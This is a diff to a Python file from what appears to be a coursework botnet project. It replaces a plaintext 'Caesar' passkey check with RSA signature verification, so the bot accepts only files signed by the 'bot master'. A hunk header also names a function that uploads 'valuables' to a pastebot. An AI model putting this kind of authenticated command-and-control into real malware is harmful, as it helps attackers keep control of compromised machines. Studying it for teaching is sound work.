@@ -1,5 +1,10 @@
 import os
 
+from Crypto.PublicKey import RSA
+from Crypto.Signature import PKCS1_v1_5
+from Crypto.Hash import SHA256
+
+
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
 filestore = {}
@@ -32,13 +37,27 @@ def upload_valuables_to_pastebot(fn):
 
 def verify_file(f):
     # Verify the file was sent by the bot master
-    # TODO: For Part 2, you'll use public key crypto here
+
     # Naive verification by ensuring the first line has the "passkey"
-    lines = f.split(bytes("\n", "ascii"), 1)
-    first_line = lines[0]
-    if first_line == bytes("Caesar", "ascii"):
-        return True
-    return False
+    #  lines = f.split(bytes("\n", "ascii"), 1)
+    # first_line = lines[0]
+    # if first_line == bytes("Caesar", "ascii"):
+    #     return True
+    # return False
+
+    #https://www.dlitz.net/software/pycrypto/api/2.6/Crypto.Signature.PKCS1_v1_5-module.html
+
+    key_file = open("master_bot_public_key.pem", "r")
+    key = RSA.importKey(key_file.read())
+    key_file.close()
+    signature = f[:512]
+    f_hashed = SHA256.new(f[512:])
+    # Should match the print statements from master_sign.py...
+    # print("signature is...")
+    # print(signature)
+    # print("f hashed is...")
+    # print(f_hashed.digest())
+    return PKCS1_v1_5.new(key).verify(f_hashed, signature)
 
 def process_file(fn, f):
     if verify_file(f):
